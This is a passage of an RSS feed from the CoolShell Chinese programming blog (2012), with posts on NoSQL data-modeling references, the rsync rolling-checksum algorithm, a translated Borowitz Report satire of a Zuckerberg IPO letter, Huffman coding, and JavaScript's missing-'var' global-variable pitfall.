<p>Graph databases 图数据库，如 neo4j 是一个出众的图数据库，尤其是使用一个结点来探索邻居结点，或是探索两个或少量结点前的关系。但是处理大量的图数据是很没有效率的，因为图数据库的性能和扩展性并不是其目的。分布式的图数据处理可以被 MapReduce 和 Message Passing pattern 来处理。如： <a title="MapReduce Patterns, Algorithms, and Use Cases" href="https://highlyscalable.wordpress.com/2012/02/01/mapreduce-patterns/">在我前一篇的文章中的那个示例</a>。这个方法可以让 Key-Value stores, Document databases, 和 BigTable-style databases 适合于处理大图。</p>
<p><strong>Applicability</strong>: Key-Value Stores, Document Databases, BigTable-style Databases</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<p>Finally, I provide a list of useful links related to NoSQL data modeling:</p>
<ol>
<li>Key-Value Stores:
<ol>
<li><a href="http://www.devshed.com/c/a/MySQL/Database-Design-Using-KeyValue-Tables/">http://www.devshed.com/c/a/MySQL/Database-Design-Using-KeyValue-Tables/</a></li>
<li>
<a href="http://antirez.com/post/Sorting-in-key-value-data-model.html">http://antirez.com/post/Sorting-in-key-value-data-model.htm</a>l</li>
<li><a href="https://stackoverflow.com/questions/3554169/difference-between-document-based-and-key-value-based-databases">http://stackoverflow.com/questions/3554169/difference-between-document-based-and-key-value-based-databases</a></li>
<li><a href="https://dbmsmusings.blogspot.com/2010/03/distinguishing-two-major-types-of_29.html">http://dbmsmusings.blogspot.com/2010/03/distinguishing-two-major-types-of_29.html</a></li>
</ol>
</li>
<li>BigTable-style Databases:
<ol>
<li><a href="http://www.slideshare.net/ebenhewitt/cassandra-datamodel-4985524">http://www.slideshare.net/ebenhewitt/cassandra-datamodel-4985524</a></li>
<li><a href="http://www.slideshare.net/mattdennis/cassandra-data-modeling">http://www.slideshare.net/mattdennis/cassandra-data-modeling</a></li>
<li><a href="http://nosql.mypopescu.com/post/17419074362/cassandra-data-modeling-examples-with-matthew-f-dennis">http://nosql.mypopescu.com/post/17419074362/cassandra-data-modeling-examples-with-matthew-f-dennis</a></li>
<li><a href="http://s-expressions.com/2009/03/08/hbase-on-designing-schemas-for-column-oriented-data-stores/">http://s-expressions.com/2009/03/08/hbase-on-designing-schemas-for-column-oriented-data-stores/</a></li>
<li><a href="http://jimbojw.com/wiki/index.php?title=Understanding_Hbase_and_BigTable">http://jimbojw.com/wiki/index.php?title=Understanding_Hbase_and_BigTable</a></li>
</ol>
</li>
<li>Document Databases:
<ol>
<li><a href="http://www.slideshare.net/mongodb/mongodb-schema-design-richard-kreuters-mongo-berlin-preso">http://www.slideshare.net/mongodb/mongodb-schema-design-richard-kreuters-mongo-berlin-preso</a></li>
<li><a href="http://www.michaelhamrah.com/blog/2011/08/data-modeling-at-scale-mongodb-mongoid-callbacks-and-denormalizing-data-for-efficiency/">http://www.michaelhamrah.com/blog/2011/08/data-modeling-at-scale-mongodb-mongoid-callbacks-and-denormalizing-data-for-efficiency/</a></li>
<li><a href="http://seancribbs.com/tech/2009/09/28/modeling-a-tree-in-a-document-database/">http://seancribbs.com/tech/2009/09/28/modeling-a-tree-in-a-document-database/</a></li>
<li><a href="https://www.mongodb.org/display/DOCS/Schema+Design">http://www.mongodb.org/display/DOCS/Schema+Design</a></li>
<li><a href="https://www.mongodb.org/display/DOCS/Trees+in+MongoDB">http://www.mongodb.org/display/DOCS/Trees+in+MongoDB</a></li>
<li><a href="http://blog.fiesta.cc/post/11319522700/walkthrough-mongodb-data-modeling">http://blog.fiesta.cc/post/11319522700/walkthrough-mongodb-data-modeling</a></li>
</ol>
</li>
<li>Full Text Search Engines:
<ol>
<li><a href="http://www.searchworkings.org/blog/-/blogs/query-time-joining-in-lucene">http://www.searchworkings.org/blog/-/blogs/query-time-joining-in-lucene</a></li>
<li><a href="http://www.lucidimagination.com/devzone/technical-articles/solr-and-rdbms-basics-designing-your-application-best-both">http://www.lucidimagination.com/devzone/technical-articles/solr-and-rdbms-basics-designing-your-application-best-both</a></li>
<li><a href="http://blog.griddynamics.com/2011/07/solr-experience-search-parent-child.html">http://blog.griddynamics.com/2011/07/solr-experience-search-parent-child.html</a></li>
<li><a href="http://www.lucidimagination.com/blog/2009/07/18/the-spanquery/">http://www.lucidimagination.com/blog/2009/07/18/the-spanquery/</a></li>
<li><a href="http://blog.mgm-tp.com/2011/03/non-standard-ways-of-using-lucene/">http://blog.mgm-tp.com/2011/03/non-standard-ways-of-using-lucene/</a></li>
<li><a href="http://www.slideshare.net/MarkHarwood/proposal-for-nested-document-support-in-lucene">http://www.slideshare.net/MarkHarwood/proposal-for-nested-document-support-in-lucene</a></li>
<li><a href="http://mysolr.com/tips/denormalized-data-structure/">http://mysolr.com/tips/denormalized-data-structure/</a></li>
<li><a href="https://sujitpal.blogspot.com/2010/10/denormalizing-maps-with-lucene-payloads.html">http://sujitpal.blogspot.com/2010/10/denormalizing-maps-with-lucene-payloads.html</a></li>
<li><a href="http://java.dzone.com/articles/hibernate-search-mapping-entit">http://java.dzone.com/articles/hibernate-search-mapping-entit</a></li>
</ol>
</li>
<li>Graph Databases:
<ol>
<li><a href="http://docs.neo4j.org/chunked/stable/tutorial-comparing-models.html">http://docs.neo4j.org/chunked/stable/tutorial-comparing-models.html</a></li>
<li><a href="http://blog.neo4j.org/2010/03/modeling-categories-in-graph-database.html">http://blog.neo4j.org/2010/03/modeling-categories-in-graph-database.html</a></li>
<li><a href="https://skillsmatter.com/podcast/nosql/graph-modelling">http://skillsmatter.com/podcast/nosql/graph-modelling</a></li>
<li><a href="http://www.umiacs.umd.edu/%7Ejimmylin/publications/Lin_Schatz_MLG2010.pdf">http://www.umiacs.umd.edu/~jimmylin/publications/Lin_Schatz_MLG2010.pdf</a></li>
</ol>
</li>
<li>Demensionality Reduction:
<ol>
<li><a href="http://www.slideshare.net/mmalone/scaling-gis-data-in-nonrelational-data-stores">http://www.slideshare.net/mmalone/scaling-gis-data-in-nonrelational-data-stores</a></li>
<li><a href="http://blog.notdot.net/2009/11/Damn-Cool-Algorithms-Spatial-indexing-with-Quadtrees-and-Hilbert-Curves">http://blog.notdot.net/2009/11/Damn-Cool-Algorithms-Spatial-indexing-with-Quadtrees-and-Hilbert-Curves</a></li>
<li><a href="http://www.trisis.co.uk/blog/?p=1287">http://www.trisis.co.uk/blog/?p=1287</a></li>
</ol>
</li>
</ol>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-05-15T08:22:13+08:00</pubDate>
<guid>https://coolshell.cn/articles/7270.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ rsync 的核心算法 ]]></title>
<link>https://coolshell.cn/articles/7425.html</link>
<content><![CDATA[ 
<p><a href="https://en.wikipedia.org/wiki/Rsync" target="_blank" rel="noopener noreferrer">rsync</a>是unix/linux下同步文件的一个高效算法，它能同步更新两处计算机的文件与目录，并适当利用查找文件中的不同块以减少数据传输。rsync中一项与其他大部分类似程序或协定中所未见的重要特性是镜像是只对有变更的部分进行传送。rsync可拷贝／显示目录属性，以及拷贝文件，并可选择性的压缩以及递归拷贝。rsync利用由<a href="https://en.wikipedia.org/wiki/Andrew_Tridgell" target="_blank" rel="noopener noreferrer">Andrew Tridgell</a>发明的算法。这里不介绍其使用方法，只介绍其核心算法。我们可以看到，Unix下的东西，一个命令，一个工具都有很多很精妙的东西，怎么学也学不完，这就是<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank" rel="noopener noreferrer">Unix的文化</a>啊。</p>
<p>本来不想写这篇文章的，因为原先发现有很多中文blog都说了这个算法，但是看了一下，发现这些中文blog要么翻译国外文章翻译地非常烂，要么就是介绍这个算法介绍得很乱让人看不懂，还有错误，误人不浅，所以让我觉得有必要写篇rsync算法介绍的文章。（当然，我成文比较仓促，可能会有一些错误，请指正）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%97%AE%E9%A2%98" title="问题">问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AE%97%E6%B3%95" title="算法">算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#rolling_checksum%E7%AE%97%E6%B3%95" title="rolling checksum算法">rolling checksum算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9B%BE%E7%A4%BA" title="图示">图示</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98"></span>问题<span class="ez-toc-section-end"></span>
</h4>
<p>首先， 我们先来想一下rsync要解决的问题，如果我们要同步的文件只想传不同的部分，我们就需要对两边的文件做diff，但是这两个问题在两台不同的机器上，无法做diff。如果我们做diff，就要把一个文件传到另一台机器上做diff，但这样一来，我们就传了整个文件，这与我们只想传输不同部的初衷相背。</p>
<p>于是我们就要想一个办法，让这两边的文件见不到面，但还能知道它们间有什么不同。这就出现了rsync的算法。</p>
<h4>
<span class="ez-toc-section" id="%E7%AE%97%E6%B3%95"></span>算法<span class="ez-toc-section-end"></span>
</h4>
<p>rsync的算法如下：（<strong>假设我们同步源文件名为fileSrc，同步目的文件叫fileDst</strong>）</p>
<p><span id="more-7425"></span></p>
<p>1）<strong>分块Checksum算法</strong>。首先，我们会把fileDst的文件平均切分成若干个小块，比如每块512个字节（最后一块会小于这个数），然后对每块计算两个checksum，</p>
<ul>
<li>一个叫<a href="https://en.wikipedia.org/wiki/Rolling_hash" target="_blank" rel="noopener noreferrer">rolling checksum</a>，是弱checksum，32位的checksum，其使用的是Mark Adler发明的<a title="Adler-32" href="https://en.wikipedia.org/wiki/Adler-32">adler-32</a>算法，</li>
<li>另一个是强checksum，128位的，以前用md4，现在用md5 hash算法。</li>
</ul>
<p>为什么要这样？因为若干年前的硬件上跑md4的算法太慢了，所以，我们需要一个快算法来鉴别文件块的不同，但是弱的adler32算法碰撞概率太高了，所以我们还要引入强的checksum算法以保证两文件块是相同的。<strong>也就是说，弱的checksum是用来区别不同，而强的是用来确认相同</strong>。（checksum的具体公式可以参看<a href="https://rsync.samba.org/tech_report/node3.html" target="_blank" rel="noopener noreferrer">这篇文章</a>）</p>
<p>2）<strong>传输算法。</strong>同步目标端会把fileDst的一个checksum列表传给同步源，这个列表里包括了三个东西，<strong>rolling checksum(32bits)</strong>，<strong>md5 checksume(128bits)</strong>，<strong>文件块编号</strong>。</p>
<p>我估计你猜到了同步源机器拿到了这个列表后，会对fileSrc做同样的checksum，然后和fileDst的checksum做对比，这样就知道哪些文件块改变了。</p>
<p>但是，聪明的你一定会有以下两个疑问：</p>
<ul>
<li>如果我fileSrc这边在文件中间加了一个字符，这样后面的文件块都会位移一个字符，这样就完全和fileDst这边的不一样了，但理论上来说，我应该只需要传一个字符就好了。这个怎么解决？</li>
</ul>
<ul>
<li>如果这个checksum列表特别长，而我的两边的相同的文件块可能并不是一样的顺序，那就需要查找，线性的查找起来应该特别慢吧。这个怎么解决？</li>
</ul>
<p>很好，让我们来看一下同步源端的算法。</p>
<p>3）<strong>checksum查找算法</strong>。同步源端拿到fileDst的checksum数组后，会把这个数据存到一个hash table中，用rolling checksum做hash，以便获得O(1)时间复杂度的查找性能。这个hash table是16bits的，所以，hash table的尺寸是2的16次方，对rolling checksum的hash会被散列到0 到 2^16 – 1中的某个整数值。（对于hash table，如果你不清楚，建议回去看大学时的数据结构教科书）</p>
<p>顺便说一下，我在网上看到很多文章说，“要对rolling checksum做排序”（比如<a href="http://www.yejun.cn/?p=472" target="_blank" rel="noopener noreferrer">这篇</a>和<a href="http://blog.csdn.net/tobeandnottobe/article/details/6719848" target="_blank" rel="noopener noreferrer">这篇</a>），这两篇文章都引用并翻译了<a href="https://rsync.samba.org/tech_report/node4.html" target="_blank" rel="noopener noreferrer">原作者的这篇文章</a>，但是他们都理解错了，不是排序，就只是把fileDst的checksum数据，按rolling checksum做存到2^16的hash table中，当然会发生碰撞，把碰撞的做成一个链表就好了。这就是<a href="https://rsync.samba.org/tech_report/node4.html" target="_blank" rel="noopener noreferrer">原文</a>中所说的第二步——搜索有碰撞的情况。</p>
<p>4）<strong>比对算法</strong>。这是最关键的算法，细节如下：</p>
<p style="padding-left: 30px;">4.1）取fileSrc的第一个文件块（我们假设的是512个长度），也就是从fileSrc的第1个字节到第512个字节，取出来后做rolling checksum计算。计算好的值到hash表中查。</p>
<p style="padding-left: 30px;">4.2）如果查到了，说明发现在fileDst中有潜在相同的文件块，于是就再比较md5的checksum，因为rolling checksume太弱了，可能发生碰撞。于是还要算md5的128bits的checksum，这样一来，我们就有 2^-(32+128) = 2^-160的概率发生碰撞，这太小了可以忽略。<strong>如果rolling checksum和md5 checksum都相同，这说明在fileDst中有相同的块，我们需要记下这一块在fileDst下的文件编号</strong>。</p>
<p style="padding-left: 30px;">4.3）如果fileSrc的rolling checksum 没有在hash table中找到，那就不用算md5 checksum了。表示这一块中有不同的信息。总之，只要rolling checksum 或 md5 checksum 其中有一个在fileDst的checksum hash表中找不到匹配项，那么就会触发算法对fileSrc的rolling动作。于是，<strong>算法会住后step 1个字节，取fileSrc中字节2-513的文件块要做checksum，go to (4.1) </strong>– 现在你明白什么叫rolling checksum了吧。</p>
<p style="padding-left: 30px;">4.4）这样，我们就可以找出fileSrc相邻两次匹配中的那些文本字符，这些就是我们要往同步目标端传的文件内容了。</p>
<h4 class="p1">
<span class="ez-toc-section" id="rolling_checksum%E7%AE%97%E6%B3%95"></span><b>rolling checksum算法</b><span class="ez-toc-section-end"></span>
</h4>
<p class="p1">这个算法很简单，也叫<a href="https://en.wikipedia.org/wiki/Rabin%E2%80%93Karp_string_search_algorithm" target="_blank" rel="noopener noreferrer">Rabin-Karp 算法</a>，由 Richard M. Karp 和 Michael O. Rabin 在 1987 年发表，它也是用来解决多模式串匹配问题的。其最大的精髓是，当我们往后面step 1个字符的时候，不用全部重新计算所有的checksum，也就是说，我们从 [0, 512] rolling 到 [1, 513] 时，我们不需要重新计算从1到513的checksum，而是重用 [0，512]的checksum直接算出来。</p>
<p class="p1">这个算法比较简单，我举个例子，我们有一个数字：12345678，假设我们以5个长度作为一个块，那么，第一个块就是 12345 ，12345可以表示为：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW"> 1 * 10^4 + 2 * 10^3 + 3 * 10^2 + 4 * 10^1 + 5 * 10^0 = 12345 </code></p>
<p class="p1">如果我们要step 1步，也就是要得到 23456， 我们不必计算：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">2 * 10^4 + 3 * 10^3 + 4 * 10^2 + 5 * 10^1 + 6 * 10^0</code></p>
<p class="p1">而是直接计算：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">(12345 - 1 * 10^4) * 10 + 6 * 10 ^0</code></p>
<p class="p1">我们可以看到，其中，我们把12345最左边第一位去掉，然后，再加上最右边的一位。这就是Rolling checksum的算法。</p>
<p class="p1">实际的公式是：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">hash ( t[0, m-1] ) = t[0] * b^(m-1) + t[1] * b^[m-2] ..... t[m-1] * b^0</code></p>
<p class="p1">其中的 b是一个常数基数，在 Rabin-Karp 算法中，我们一般取值为  256。</p>
<p class="p1">于是，在计算 hash ( t[1, m] ) 时，只需要下面这样就可以了：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">hash( t[1, m] ) = hash ( t[0, m-1] ) - t[0] * b^(m-1) + t[m] * b ^0</code></p>
<h4>
<span class="ez-toc-section" id="%E5%9B%BE%E7%A4%BA"></span>图示<span class="ez-toc-section-end"></span>
</h4>
<p>怎么，你没看懂？ 好吧，我送佛送上西，画个示意图给你看看（对图中的东西我就不再解释了）。</p>
<p><img alt="image placeholder" ></p>
<p>这样，最终，在同步源这端，我们的rsync算法可能会得到下面这个样子的一个数据数组，图中，红色块表示在目标端已匹配上，不用传输（注：我专门在其中显示了两块chunk #5，相信你会懂的），而白色的地方就是需要传输的内容（注意：这些白色的块是不定长的），这样，同步源这端把这个数组（白色的就是实际内容，红色的就放一个标号）压缩传到目的端，在目的端的rsync会根据这个表重新生成文件，这样，同步完成。</p>
<p><img alt="image placeholder" ></p>
<p>最后想说一下，对于某些压缩文件使用rsync传输可能会传得更多，因为被压缩后的文件可能会非常的不同。对此，对于gzip和bzip2这样的命令，记得开启 “rsyncalbe” 模式。</p>
<p>（全文完，<strong>转载时请注明作者和出处</strong>）</p>
<p><audio style="display: none;" controls="controls"></audio></p>
<p><audio style="display: none;" controls="controls"></audio></p>
 ]]></content>
<pubDate>2012-05-17T08:25:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/7425.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 扎克伯格的一封信：关于Facebook IPO ]]></title>
<link>https://coolshell.cn/articles/7448.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >MENLO PARK, CA (<strong><strong><a title="Borowitz Report" href="http://www.borowitzreport.com/2012/05/17/a-letter-from-mark-zuckerberg/" target="_blank">The Borowitz Report</a></strong></strong>) – 在Fackbook IPO前夕，Facebook的创始人兼CEO Mark Zuckerberg 给全球股民发表了封公开信：</p>
<p>亲爱的股民们：</p>
<p style="padding-left: 60px;">    这么多年来，你们已经在Facebook上浪费了你们的时间 ，接下来，你们会得到浪费你们金钱的机会。</p>
<p>   明天是Facebook的IPO，并且我知道你们一定在想，Facebook怎么就和2000年的.COM泡沫不一样啦？</p>
<p>首先，我想告诉你们，以前那些糟糕的dot-com公司玩的是概念和炒作，而没有真正的商业价值。而Facebook不一样，也就是说，我们Facebook是建立在强大的以“疯狂的小鸟”和“一群想像中的羊”的基础上的。</p>
<p>其次，Facebook是世界上最成功的社交网络，我们的用户最近才发现，这个社交网络让人们分享了数以万计别人根本不感兴趣的信息。</p>
<p>第三，当某人点击Faceback广告的时候，我们就会挣到钱。而且我们知道，点我们广告的人都不是故意点击，成百万的人点我们的广告是因为那时他们喝醉了。我们完全从iTunes偷到这个有创意的想法。</p>
<p>最后，如果你买我们的股票，你将永远不会孤独。据调查，在过去几年里使用facebook的全球9亿用户，他们都有轻微或中等程度的大脑损伤，这影响了他们的作正常判断的能力。所以，这些人都成为你的朋友——Facebook的股民。</p>
<p>有了你的帮助，如果明天一切都照计划进行，Facebook IPO将会募到1000亿美金。这是个什么概念，这相当于4到5个摩根大通银行损失的钱。</p>
<p>最后一件事：我，Mark Zuckerberg，是否会因此IPO获得180亿美金？ 也许，我正在考虑把希腊买了，但就算是这样，我还是有180亿美金。 LOL.</p>
<p>Friend me (粉我),</p>
<p>Mark</p>
<div>（新闻来源：<a href="http://www.borowitzreport.com/2012/05/17/a-letter-from-mark-zuckerberg/" target="_blank">http://www.borowitzreport.com/2012/05/17/a-letter-from-mark-zuckerberg/</a>）</div>
<p></p>
 ]]></content>
<pubDate>2012-05-19T11:01:21+08:00</pubDate>
<guid>https://coolshell.cn/articles/7448.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Huffman 编码压缩算法 ]]></title>
<link>https://coolshell.cn/articles/7459.html</link>
<content><![CDATA[ 
<p>前两天发布那个<a title="rsync 的核心算法" href="https://coolshell.cn/articles/7425.html" target="_blank">rsync算法</a>后，想看看数据压缩的算法，知道一个经典的压缩算法Huffman算法。相信大家应该听说过 <a title="David Huffman" href="https://en.wikipedia.org/wiki/David_A._Huffman" target="_blank">David Huffman</a> 和他的压缩算法—— <a href="https://en.wikipedia.org/wiki/Huffman_coding" target="_blank">Huffman Code</a>，一种通过字符出现频率，<a href="https://en.wikipedia.org/wiki/Priority_queue" target="_blank">Priority Queue</a>，和二叉树来进行的一种压缩算法，这种二叉树又叫Huffman二叉树 —— 一种带权重的树。从学校毕业很长时间的我忘了这个算法，但是网上查了一下，中文社区内好像没有把这个算法说得很清楚的文章，尤其是树的构造，而正好看到一篇国外的文章《<a href="http://en.nerdaholyc.com/huffman-coding-on-a-string/" target="_blank">A Simple Example of Huffman Code on a String</a>》，其中的例子浅显易懂，相当不错，我就转了过来。注意，我没有对此文完全翻译。</p>
<p>我们直接来看示例，如果我们需要来压缩下面的字符串：</p>
<p style="text-align: center;"><strong> “beep boop beer!” </strong></p>
<p>首先，我们先计算出每个字符出现的次数，我们得到下面这样一张表 :</p>
<p></p>
<center>
<table style="width: 250px; height: 200px;">
<tbody>
<tr>
<td><span style="font-size: 12px;">字符</span></td>
<td>次数</td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘b’</span></td>
<td><span style="font-size: 12px;">3</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘e’</span></td>
<td><span style="font-size: 12px;">4</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘p’</span></td>
<td><span style="font-size: 12px;">2</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘ ‘</span></td>
<td><span style="font-size: 12px;">2</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘o’</span></td>
<td><span style="font-size: 12px;">2</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘r’</span></td>
<td><span style="font-size: 12px;">1</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘!’</span></td>
<td><span style="font-size: 12px;">1</span></td>
</tr>
</tbody>
</table>
<p></p>
</center>
<br>
然后，我把把这些东西放到Priority Queue中（用出现的次数据当 priority），我们可以看到，Priority Queue 是以Prioirry排序一个数组，如果Priority一样，会使用出现的次序排序：下面是我们得到的Priority Queue：
<p><span id="more-7459"></span></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/coada1.png"><img alt="image placeholder" ></a></p>
<p>接下来就是我们的算法——把这个Priority Queue 转成二叉树。我们始终从queue的头取两个元素来构造一个二叉树（第一个元素是左结点，第二个是右结点），并把这两个元素的priority相加，并放回Priority中（再次注意，这里的Priority就是字符出现的次数），然后，我们得到下面的数据图表：</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/coada2.png"><img alt="image placeholder" ></a></p>
<p>同样，我们再把前两个取出来，形成一个Priority为2+2=4的结点，然后再放回Priority Queue中 :</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/coada31.png"><img alt="image placeholder" ></a></p>
<p>继续我们的算法（我们可以看到，这是一种自底向上的建树的过程）：</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/coada4.png"><img alt="image placeholder" ></a></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/coada5.png"><img alt="image placeholder" ></a></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/coada61.png"><img alt="image placeholder" ></a></p>
<p>最终我们会得到下面这样一棵二叉树：</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/arbore_final.png"><img alt="image placeholder" ></a></p>
<p>此时，我们把这个树的左支编码为0，右支编码为1，这样我们就可以遍历这棵树得到字符的编码，比如：‘b’的编码是 00，’p’的编码是101， ‘r’的编码是1000。<strong>我们可以看到出现频率越多的会越在上层，编码也越短，出现频率越少的就越在下层，编码也越长</strong>。</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/arbore_final_numerotat.png"><img alt="image placeholder" ></a></p>
<p>最终我们可以得到下面这张编码表：</p>
<p></p>
<center>
<table style="width: 250px; height: 200px;">
<tbody>
<tr>
<td>字符</td>
<td>编码</td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘b’</span></td>
<td><span style="font-size: 12px;">00</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘e’</span></td>
<td><span style="font-size: 12px;">11</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘p’</span></td>
<td><span style="font-size: 12px;">101</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘ ‘</span></td>
<td><span style="font-size: 12px;">011</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘o’</span></td>
<td><span style="font-size: 12px;">010</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘r’</span></td>
<td><span style="font-size: 12px;">1000</span></td>
</tr>
<tr>
<td><span style="font-size: 12px;">‘!’</span></td>
<td><span style="font-size: 12px;">1001</span></td>
</tr>
</tbody>
</table>
<p></p>
</center>
<br>
这里需要注意一点，当我们encode的时候，我们是按“bit”来encode，decode也是通过bit来完成，比如，如果我们有这样的bitset “1011110111″ 那么其解码后就是 “pepe”。所以，我们需要通过这个二叉树建立我们Huffman编码和解码的字典表。
<p>这里需要注意的一点是，我们的Huffman对各个字符的编码是不会冲突的，也就是说，<strong>不会存在某一个编码是另一个编码的前缀</strong>，不然的话就会大问题了。因为encode后的编码是没有分隔符的。</p>
<p style="text-align: left; padding-left: 30px;">于是，对于我们的原始字符串  beep boop beer!</p>
<p style="text-align: left; padding-left: 30px;">其对就能的二进制为 : 0110 0010 0110 0101 0110 0101 0111 0000 0010 0000 0110 0010 0110 1111 0110 1111 0111 0000 0010 0000 0110 0010 0110 0101 0110 0101 0111 0010 0010 0001</p>
<p style="text-align: left; padding-left: 30px;">我们的Huffman的编码为： 0011 1110 1011 0001 0010 1010 1100 1111 1000 1001</p>
<p>从上面的例子中，我们可以看到被压缩的比例还是很可观的。</p>
<p>作者给出了源码你可以看看（ C99标准） <a href="http://en.nerdaholyc.com/wp-content/uploads/2012/05/huffman_string.zip">Download the source files</a></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-05-22T13:32:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/7459.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Javascript 中的 var ]]></title>
<link>https://coolshell.cn/articles/7480.html</link>
<content><![CDATA[ 
<p>MelonCard发布了一篇文章——”<a href="http://blog.meloncard.com/post/12175941935/how-one-missing-var-ruined-our-launch" target="_blank">how one missing var ruined our launch</a>“（”少写了一个var毁了我的网站”），这篇文章是说MelonCard用Node.js做后台，因为出了一个小高峰——有50-100人注册，结果整个网站都不响应了，而且还出现了很多奇怪的问题。当他们调查到问题的要源的时候，他们发现下面的代码少写了一个var。</p>
<p>[javascript]app.all(‘/apps/:user_id/status’, function(req, res, next) {<br>
// …<br>
initial = extractVariables(req.body);<br>
});[/javascript]</p>
<p>为什么inital少写一个var会引发这个问题呢？因为如果你不写var，这个局部的变量会被javascript当成全局变量，而这个变量又是一个函数，所以，当多用户并发的时候，这个本应该在不同用户下互不干扰的变量，成了各个用户共享的东西。试想，用户A的数据被用户B覆盖了，用户A和B的数据还没处理完，结果被新的C给搞乱了，程序的逻辑自然出现了问题。</p>
<p>在stackoverflow.com上有<a href="https://stackoverflow.com/questions/1470488/difference-between-using-var-and-not-using-var-in-javascript" target="_blank">这么一个贴子说明了“有var”和“无var”</a>的差别：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">// These are both globals
var foo = 1;
bar = 2;

function test()
{
    var foo = 1; // Local
    bar = 2;     // Global

    // Execute an anonymous function
    (function()
    {
        var wibble = 1; // Local
        foo = 2; // Inherits from scope above (creating a closure)
        moo = 3; // Global
    }())
}</pre>
<p>上面这个示例告诉我们，如果你不用var，那么这个js引擎会一层一层地向上找父作用域中的变量，如果找到了，就用，如果找不到了，就会帮你定义一个全局的变量。上面这个例子充分说明了这一点。所以，<strong>如果你想在当前的作用域用声明变量，你一定要用var</strong>。这对于一些乱写javascript代码的程序员要注意了。这里再给大家介绍一个工具——</p>
<p><span id="more-7480"></span></p>
<p><strong>JSLint( <a href="http://www.jslint.com/">http://www.jslint.com/</a> )</strong>，一个JS代码质量的分析工具，我们把上述stackoverflow的代码copy到JSLint这个在线工具中，我们可以看到下面的报告：</p>
<p><img alt="image placeholder" ></p>
<p>这个报告说明了源码中的那些变量的情况。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-05-24T14:50:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/7480.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Lisp的永恒之道 ]]></title>
<link>https://coolshell.cn/articles/7526.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000;">感谢 Todd投递本文 – 微博帐号：</span><a title="weidagang" href="https://weibo.com/weidagang" target="_blank">weidagang</a> 】</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Lisp%E4%B9%8B%E9%AD%85" title="Lisp之魅">Lisp之魅</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Lisp%E4%B9%8B%E6%BA%90" title="Lisp之源">Lisp之源</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Lisp%E4%B9%8B%E5%BD%A2" title="Lisp之形">Lisp之形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Lisp%E4%B9%8B%E9%81%93" title="Lisp之道">Lisp之道</a></li>
